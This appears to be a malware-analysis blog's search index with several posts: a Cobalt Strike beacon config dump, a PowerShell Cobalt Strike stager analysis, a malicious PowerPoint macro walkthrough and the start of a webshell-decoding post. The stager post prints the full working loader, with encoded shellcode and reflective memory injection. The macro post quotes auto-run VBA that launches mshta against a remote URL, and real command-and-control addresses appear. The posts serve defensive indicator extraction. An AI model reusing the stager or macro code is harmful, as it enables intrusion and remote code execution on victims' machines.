HttpPostChunk 0x0002 0x0004 00x0025 license-id 0x0002 0x0004 3054198960x0026 bStageCleanup 0x0001 0x0002 00x0027 bCFGCaution 0x0001 0x0002 00x0036 HostHeader 0x0003 0x0080 (NULL ...)0x0032 UsesCookies 0x0001 0x0002 10x0023 proxy_type 0x0001 0x0002 2 IE settings0x0037 EXIT_FUNK 0x0001 0x0002 00x0028 killdate 0x0002 0x0004 00x0029 textSectionEnd 0x0002 0x0004 00x002b process-inject-start-rwx 0x0001 0x0002 64 PAGE_EXECUTE_READWRITE0x002c process-inject-use-rwx 0x0001 0x0002 64 PAGE_EXECUTE_READWRITE0x002d process-inject-min_alloc 0x0002 0x0004 00x002e process-inject-transform-x86 0x0003 0x0100 (NULL ...)0x002f process-inject-transform-x64 0x0003 0x0100 (NULL ...)0x0035 process-inject-stub 0x0003 0x0010 &#39;¥l\\x818d¯\\x87\\x8aL\\x10\\x08&amp;lt;¡W\\x8e\\n&#39;0x0033 process-inject-execute 0x0003 0x0080 &#39;\\x01\\x02\\x03\\x04&#39;0x0034 process-inject-allocation-method 0x0001 0x0002 00x0000Guessing Cobalt Strike version: 4.0 (max 0x0037)The most actionable indicators from this output are: server,get-uri ‘42.193.229.33,/j.ad’ port 12342 useragent ‘Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)’ post-uri ‘/submit.php’ spawnto_x86 ‘%windir%\\syswow64\\rundll32.exe’ spawnto_x64 ‘%windir%\\sysnative\\rundll32.exe’The server, get-uri, set-uri, port, and useragent fields are pretty helpful for network-based detection telemetry. In you can use PCAP, logs, or Netflow evidence to spot one or more of these components. The useragent and post-uri fields will need to be combined with additional data to be effective. The spawnto_* fields are helpful for endpoint-based detection telemetry. You can use Sysmon, EDR, or whatever else to look for suspicious instances of rundll32.exe with no command line. For this particular threat, we’ll likely see a process ancestry of mshta.exe -&amp;gt; notepad.exe -&amp;gt; rundll32.exe.A data point that is less actionable but still interesting is the license-id/watermark. In this case the beacon contains the license-id value 305419896. This value has been seen in multiple incidents over the last few years, and it corresponds with a leaked version of Cobalt Strike.Now that we’ve squeezed all those indicators out of the beacon, let’s try and confirm the process ancestry for endpoint detection analytics.Using a Sandbox Report to Confirm BehaviorThankfully, a sandbox report for the HTA already exists thanks to VMRay: https://www.vmray.com/analyses/4d4d70e19184/report/overview.htmlLooking over at the “Behavior” tab, we can confirm at least part of the ancestry:So for detection analytics we can look for instances of notepad.exe spawning from mshta.exe to find suspicious behavior for this threat. Thanks for reading!" }, { "title": "Inspecting a PowerShell Cobalt Strike Beacon", "url": "/inspecting-powershell-cobalt-strike-beacon/", "categories": "malware", "tags": "malware, powershell, cobalt-strike", "date": "2022-01-09 00:00:00 +0000", "snippet": "In this post I want to take a look at a PowerShell-based Cobalt Strike beacon that appeared on MalwareBazaar. This particular beacon is representative of most PowerShell Cobalt Strike activity I see in the wild during my day job. The beacons often show up as service persistence during incidents or during other post-exploitation activity. If you want to follow along at home, the sample I’m using is here:https://bazaar.abuse.ch/sample/6881531ab756d62bdb0c3279040a5cbe92f9adfeccb201cca85b7d3cff7158d3/Triaging the FileJust like with other files, let’s approach with caution and verify the file is actually PowerShell. We can use file and head to do this.remnux@remnux:~/cases/cobaltstrike$ file payload.ps1 payload.ps1: ASCII text, with very long linesremnux@remnux:~/cases/cobaltstrike$ head -c 100 payload.ps1 Set-StrictMode -Version 2$DoIt = @&#39;ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX2We definitely have some PowerShell here. The cmdlet Set-StrictMode is a PowerShell feature used to enforce “scripting best practices.” In addition, the @&#39; signals the use of a “here-string”, a string that may use multiple quotation mark literals and multiple lines of text. Now that we have a grasp of the file type, let’s take a look at the contents.Inspecting the File ContentsI personally love VSCode for inspecting code files, I know others typically get along with Sublime Editor as well. In this sample, we can observe:Set-StrictMode -Version 2$DoIt = @&#39;ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t1d1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVVZOQUl4d2tEMnZhVVlpUVVVbGlNejlqdXpUellBNkYwbzE4K0J5VzJNMU5sdzA3Y0JxUmEyZ3F5Mm5DWEZacGVJWGU3QnowK09uZ0NPNHQwbXdCVHFyRTU3cnloTHY3WjJrOGhaRzBJMnRNVUZjWkEweFdWMDlNVEVnTlQwcFZSZzFBVEU0dUtXSkFRRVpUVnhrRENRd0pMaWwyVUVaUkRtSkVSazFYR1FOdVRGbEtUMDlDREJZTkV3TUxkRXBOUjB4VVVBTnRkd01WRFJJS0EySlRVMDlHZEVaQmFFcFhEQllRRkEwUUZRTUxhR3QzYm04UEEwOUtTRVlEWkVaQVNFd0tMaWtqNGZpdWVPdVlsenRONFpmWnpLQkJqaE5yNmZGUmVBeWk4TG81NEVDSnZOc3plYlJnb0JZd3AxUTNXbENtSm5qZWkyTW5JQ1BlZ1JGR3ZpNnlRZzBxdXczb0kxeWZFTXNUektLVi9OaEg0THdGYVBYODlLQXJ1QzR5ZUJCV0pxODJLN0YvTUtoekd0Y2wvSGF6ZU1CYUh2ZFRheDlZdFVORGRqazZUNVlvc0JhdFlxMm51T09ONmI0amN4eS9uQnQ5dlE4aHFTQkx5RkYyY2NJNkI2NTUxUkpNSEF3d25tVzMrOTFHa2daWmFGZlJxOWJucVVaME5pTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNGeFFORVJjUkRSSVZGdzBRRUNOeUtweE8nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZXRfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p&#39;@$aa1234 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($DoIt))If ([IntPtr]::size -eq 8) { start-job { param($a) IEX $a } -RunAs32 -Argument $aa1234 | wait-job | Receive-Job}else { IEX $aa1234}We can see the contents of $DoIt contain a decently-sized chunk of base64 text, but it’s likely not big enough to be a complete Windows EXE. The contents of the base64 string are decoded, converted to UTF-8 and then executed using a combination of Start-Job and Invoke-Expression commands.To get our next step, let’s decode the base64 string manually using base64 -d. I’ve gone ahead and included the decoded code here:function func_get_proc_address { Param ($var_module, $var_procedure) $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#39;\\\\&#39;)[-1].Equals(&#39;System.dll&#39;) }).GetType(&#39;Microsoft.Win32.UnsafeNativeMethods&#39;) $var_gpa = $var_unsafe_native_methods.GetMethod(&#39;GetProcAddress&#39;, [Type[]] @(&#39;System.Runtime.InteropServices.HandleRef&#39;, &#39;string&#39;)) return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($null, @($var_module)))), $var_procedure))}function func_get_delegate_type { Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters, [Parameter(Position = 1)] [Type] $var_return_type = [Void] ) $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#39;ReflectedDelegate&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#39;InMemoryModule&#39;, $false).DefineType(&#39;MyDelegateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate]) $var_type_builder.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#39;Runtime, Managed&#39;) $var_type_builder.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $var_return_type, $var_parameters).SetImplementationFlags(&#39;Runtime, Managed&#39;) return $var_type_builder.CreateType()}[Byte[]]$var_code = [System.Convert]::FromBase64String(&#39;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuwPCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMUVNAIxwkD2vaUYiQUUliMz9juzTzYA6F0o18+ByW2M1Nlw07cBqRa2gqy2nCXFZpeIXe7Bz0+OngCO4t0mwBTqrE57ryhLv7Z2k8hZG0I2tMUFcZA0xWV09MTEgNT0pVRg1ATE4uKWJAQEZTVxkDCQwJLil2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLdEpNR0xUUANtdwMVDRIKA2JTU09GdEZBaEpXDBYQFA0QFQMLaGt3bm8PA09KSEYDZEZASEwKLikj4fiueOuYlztN4ZfZzKBBjhNr6fFReAyi8Lo54ECJvNszebRgoBYwp1Q3WlCmJnjei2MnICPegRFGvi6yQg0quw3oI1yfEMsTzKKV/NhH4LwFaPX89KAruC4yeBBWJq82K7F/MKhzGtcl/HazeMBaHvdTax9YtUNDdjk6T5YosBatYq2nuOON6b4jcxy/nBt9vQ8hqSBLyFF2ccI6B6551RJMHAwwnmW3+91GkgZZaFfRq9bnqUZ0NiNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcFxQNERcRDRIVFw0QECNyKpxO&#39;)for ($x = 0; $x -lt $var_code.Count; $x++) { $var_code[$x] = $var_code[$x] -bxor 35}$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))There’s a LOT to unpack here and wrap our brains around. To keep this post short and sweet, there are two portions to focus upon: The contents of $var_code The chunk of code containing $var_code[$x] = $var_code[$x] -bxor 35Suffice to say, the rest of the code is overhead required to inject shellcode reflectively into the memory space of the PowerShell process executing the script. If you’re curious about those portions, take a look into these keywords: GetProcAddress InMemoryModule ReflectedDelegateDecoding the ShellcodeThe $var_code variable contains Cobalt Strike beacon shellcode that was XOR’d with the value 35 before being base64 encoded. We can decode all this PowerShell on any platform. I’m using the command pwsh to do this on REMnux.PS /home/remnux/cases/cobaltstrike&amp;gt; [Byte[]]$var_code = [System.Convert]::FromBase64String(&#39;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuwPCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMUVNAIxwkD2vaUYiQUUliMz9juzTzYA6F0o18+ByW2M1Nlw07cBqRa2gqy2nCXFZpeIXe7Bz0+OngCO4t0mwBTqrE57ryhLv7Z2k8hZG0I2tMUFcZA0xWV09MTEgNT0pVRg1ATE4uKWJAQEZTVxkDCQwJLil2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLdEpNR0xUUANtdwMVDRIKA2JTU09GdEZBaEpXDBYQFA0QFQMLaGt3bm8PA09KSEYDZEZASEwKLikj4fiueOuYlztN4ZfZzKBBjhNr6fFReAyi8Lo54ECJvNszebRgoBYwp1Q3WlCmJnjei2MnICPegRFGvi6yQg0quw3oI1yfEMsTzKKV/NhH4LwFaPX89KAruC4yeBBWJq82K7F/MKhzGtcl/HazeMBaHvdTax9YtUNDdjk6T5YosBatYq2nuOON6b4jcxy/nBt9vQ8hqSBLyFF2ccI6B6551RJMHAwwnmW3+91GkgZZaFfRq9bnqUZ0NiNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcFxQNERcRDRIVFw0QECNyKpxO&#39;)PS /home/remnux/cases/cobaltstrike&amp;gt; for ($x = 0; $x -lt $var_code.Count; $x++) {&amp;gt;&amp;gt; $var_code[$x] = $var_code[$x] -bxor 35PS /home/remnux/cases/cobaltstrike&amp;gt; Set-Content -Path ./shellcode.bin -Value $var_code -AsByteStreamNow we can take a look at the shellcode.bin file to get indicators. Also, the XOR with 35 is an indicator that the beacon is Cobalt Strike and not Metasploit or similar.Getting Indicators from the ShellcodeLet’s verify we have some functioning shellcode. We can do this with capa.remnux@remnux:~/cases/cobaltstrike$ capa -f sc32 shellcode.bin +------------------------+------------------------------------------------------------------+| md5 | 63603bb6854a022e997a06fe7220a220 || sha1 | ce72e661393227a1816e43159139860660118ccb || sha256 | 0a0dddca72464f3baa600be64e9f7da9c0cbe1126e8e713d0c9dba6ed231234a || path | shellcode.bin |+------------------------+------------------------------------------------------------------++------------------------+------------------------------------------------------------------+| ATT&amp;amp;CK Tactic | ATT&amp;amp;CK Technique ||------------------------+------------------------------------------------------------------|| DEFENSE EVASION | Virtualization/Sandbox Evasion::System Checks T1497.001 || EXECUTION | Shared Modules:: T1129 |+------------------------+------------------------------------------------------------------++-----------------------------+-------------------------------------------------------------+| MBC Objective | MBC Behavior ||-----------------------------+-------------------------------------------------------------|| ANTI-BEHAVIORAL ANALYSIS | Virtual Machine Detection::Instruction Testing [B0009.029] |+-----------------------------+-------------------------------------------------------------++------------------------------------------------------+------------------------------------+| CAPABILITY | NAMESPACE ||------------------------------------------------------+------------------------------------|| execute anti-VM instructions | anti-analysis/anti-vm/vm-detection || access PEB ldr_data | linking/runtime-linking || parse PE exports | load-code/pe |+------------------------------------------------------+------------------------------------+We definitely have some shellcode functionality here. The important part for me is the part about access PEB ldr data. This capability refers to the ability of the shellcode to resolve imports so it can use functions from DLLs. Shellcode doesn’t have an import table like standard Windows EXEs do, so it has to go the long way around to find all its needed functions.Since we’re pretty sure this is a Cobalt Strike we can get further indicators using a couple tools. The first and simplest is strings.remnux@remnux:~/cases/cobaltstrike$ strings shellcode.bin ;}$uD$$[[aYZQ]hnethwiniThLw&amp;amp;WWWWWh:VySPhWRRRSRPhSVhhE!^1QVPh/rpcHost: outlook.live.comAccept: */*User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)pH&amp;lt;{1o?/%zKt47.242.164[.]33We can see some elements in the strings that could appear in HTTP traffic. These details are: 47.242.164[.]33/rpc is likely the command and control address User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) is a HTTP User-Agent string Host: outlook.live.com and Accept: */* are HTTP header valuesAnother good way to glean indicators is using 1768.py, a tool specifically designed to pull Cobalt Strike configuration details from beacons.remnux@remnux:~/cases/cobaltstrike$ 1768.py --raw shellcode.bin File: shellcode.binProbably found shellcode:Parameter: 778 b&#39;47.242.164.33&#39;license-id: 792 1359593325push : 190 8083 b&#39;h\\x93\\x1f\\x00\\x00&#39;push : 716 4096 b&#39;h\\x00\\x10\\x00\\x00&#39;push : 747 8192 b&#39;h\\x00 \\x00\\x00&#39;String: 440 b&#39;User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)&#39;00000000: FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B ......`..1.d.R0.00000010: 52 0C 8B 52 14 8B 72 28 0F B7 4A 26 31 FF 31 C0 R..R..r(..J&amp;amp;1.1.00000020: AC 3C 61 7C 02 2C 20 C1 CF 0D 01 C7 E2 F0 52 57 .&amp;lt;a|., .......RW00000030: 8B 52 10 8B 42 3C 01 D0 8B 40 78 85 C0 74 4A 01 .R..B&amp;lt;...@x..tJ....We have a little confirmation on indicators here, and we also got an additional one: a license ID. Cobalt Strike beacons are supposed to contain watermarks/license IDs that allow analysts to track a beacon back to one particular licensee. In this case, we see the value 1359593325. This value has been seen with loads of different activity in recent years from different groups.And that’s it for this post! If you’ve never seen a Cobalt Strike beacon before, this is probably the simplest version I’ve seen in a long time. Thank you for reading!" }, { "title": "Looking at PowerPoint Macros with Olevba", "url": "/powerpoint-macros-olevba/", "categories": "Malware", "tags": "malware, powerpoint, macros, mshta, olevba", "date": "2022-01-07 00:00:00 +0000", "snippet": "In this post I want to walk through analysis of a malicious PowerPoint file using olevba. This tool allows you to view macros within Office documents without opening them. If you want to follow along at home, I’m using this sample from MalwareBazaar:https://bazaar.abuse.ch/sample/a0f6d9d905b64be221a64da385ad1fd14542c93b35f23cdcbedf71febc68a505/Triaging the FileVirusTotal and MalwareBazaar think the sample is a PowerPoint file with macros, but they could always be wrong. We can confirm using the file utility.remnux@remnux:~/cases/ppt$ file PO04012022.ppam PO04012022.ppam: Microsoft PowerPoint 2007+Sure enough, the magic bytes say the file is a PowerPoint presentation. Now let’s take a look at the size with exiftool.remnux@remnux:~/cases/ppt$ exiftool PO04012022.ppam ExifTool Version Number : 12.30File Name : PO04012022.ppamDirectory : .File Size : 8.6 KiBFile Modification Date/Time : 2022:01:06 02:01:18-05:00File Access Date/Time : 2022:01:05 21:17:11-05:00File Inode Change Date/Time : 2022:01:05 21:03:25-05:00File Permissions : -rw-r--r--File Type : PPAMFile Type Extension : ppamMIME Type : application/vnd.ms-powerpoint.addin.macroEnabled.12Zip Required Version : 20Zip Bit Flag : 0Zip Compression : DeflatedZip Modify Date : 2022:01:03 23:05:02Zip CRC : 0xb918195eZip Compressed Size : 283Zip Uncompressed Size : 597Zip File Name : [Content_Types].xmlThe file weighs in at under 9 KiB, so I would hazard a guess that it doesn’t contain much, if any, embedded content like binaries. Now let’s dig in with analysis tools.Analyzing the PPAMWe can issue a simple olevba command and see the output that comes back by default.remnux@remnux:~/cases/ppt$ olevba PO04012022.ppam olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools===============================================================================FILE: PO04012022.ppamType: OpenXMLWARNING For now, VBA stomping cannot be detected for files in memory-------------------------------------------------------------------------------VBA MACRO Class1.cls in file: ppt/qwqwae.d - OLE stream: &#39;VBA/Class1&#39;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Public Function lol()Debug.Assert (VBA.Shell(&quot;c:\\windows\\system32\\calc\\..\\conhost.exe c:\\windows\\system32\\calc\\..\\conhost.exe mshta hxxp://www.j[.]mp/askswewewewzxzxkd&quot;))End Function-------------------------------------------------------------------------------VBA MACRO Module11.bas in file: ppt/qwqwae.d - OLE stream: &#39;VBA/Module11&#39;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Sub Auto_Open()Dim obj As New Class1Debug.Print MsgBox(&quot;ERROR!Re-Install Office&quot;, vbOKCancel); returns; 1obj.lolEnd Sub+----------+--------------------+---------------------------------------------+|Type |Keyword |Description |+----------+--------------------+---------------------------------------------+|AutoExec |Auto_Open |Runs when the Excel Workbook is opened ||Suspicious|Shell |May run an executable file or a system || | |command ||Suspicious|windows |May enumerate application windows (if || | |combined with Shell.Application object) ||Suspicious|Hex Strings |Hex-encoded strings were detected, may be || | |used to obfuscate strings (option --decode to|| | |see all) ||Suspicious|Base64 Strings |Base64-encoded strings were detected, may be || | |used to obfuscate strings (option --decode to|| | |see all) ||IOC |hxxp://www.j[.]mp/asks|URL || |wewewewzxzxkd | ||IOC |conhost.exe |Executable file name |+----------+--------------------+---------------------------------------------+There’s a fair bit of information to work through here. Olevba does some analysis work for you to point out suspicious features of the macro code. First, the sample contains macro code defining an Auto_Open function. Just like it sounds, whatever is in this function will get executed as soon as the document gets opened. The output shows olevba found possible obfuscated strings, an executable name, and a URL. Looking further back we can see the actual macro code. First, let’s take a look at that Auto_Open function.Sub Auto_Open()Dim obj As New Class1Debug.Print MsgBox(&quot;ERROR!Re-Install Office&quot;, vbOKCancel); returns; 1obj.lolEnd SubThe macro creates an object obj of the type Class1, which must also be defined in the macro. It pops up a messagebox (MsgBox) with an error message to distract the victim. Finally, it calls the function obj.lol(). Let’s dive into Class1 to see what its lol() function does.Public Function lol()Debug.Assert (VBA.Shell(&quot;c:\\windows\\system32\\calc\\..\\conhost.exe c:\\windows\\system32\\calc\\..\\conhost.exe mshta hxxp://www.j[.]mp/askswewewewzxzxkd&quot;))End FunctionThe lol() function uses VBA.Shell to launch the command in the provided string. As for the string, I’m not really sure what they’re trying to do here. I assume they’re going for some form of evasion where they somehow call mshta.exe but muddy the water with conhost.exe processes during analysis. The sandbox report from Joe Sandbox doesn’t indicate mshta.exe actually executed. As for the final payload, the adversary presumably has a HTML Application (HTA) file hosted at hxxp://www.j[.]mp/askswewewewzxzxkd and if mshta.exe downloads executes the payload it might execute arbitrary script content.That’s it for today, thanks for reading!" }, { "title": "Decoding an Encoded Webshell Using NodeJS", "url": "/decoding-webshell-using-nodejs/", "categories": "Malware", "tags": "malware, webshell, nodejs, javascript", "date": "2022-01-06 00:00:00 +0000", "snippet": "In this post I want to walk through a process of using the NodeJS REPL (Read, Eval, Print Loop) to safely decode portions of malware during analysis. If you want to follow along at home, the sample I’m working with is here in MalwareBazaar:https://bazaar.abuse.ch/sample/0ca9ca069b144ee4f9359f917c70c15015126eefa6bd60c9a2da77169f3ea122/Initial File TriageThe tags in MalwareBazaar say the sample is a webshell, but it’s always possible the sample was misclassified. So, let’s approach it with caution and get an idea of its contents using file.remnux@remnux:~/cases/wso$ file wso.js wso.js: ASCII text, with very long lines, with no line terminatorsIt looks like we’re working with a simple text file. Let’s take a peek at the contents using head or less. Since all the code inside is on just one or two lines, head returns all the text by default. Let’s just limit it to the first 100 bytes.remnux@remnux:~/cases/wso$ head wso.js -c 